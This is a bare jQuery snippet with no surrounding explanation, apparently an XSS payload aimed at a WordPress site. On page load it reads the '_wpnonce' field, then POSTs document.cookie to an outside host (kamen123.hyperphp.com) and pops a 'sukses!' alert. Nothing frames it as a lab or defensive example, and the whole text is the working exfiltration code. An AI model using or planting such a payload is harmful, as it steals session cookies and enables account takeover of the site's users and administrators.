
    $(document).ready(function(){
        var x = document.getElementById("_wpnonce").value;
        console.log(x);
        $.ajax({
            type: 'POST',

            url: 'http://www.kamen123.hyperphp.com/test.php',
            data: {
                "field_1": document.cookie
    },
            success: function (msg) {
                alert('sukses!');

            }
        });
});
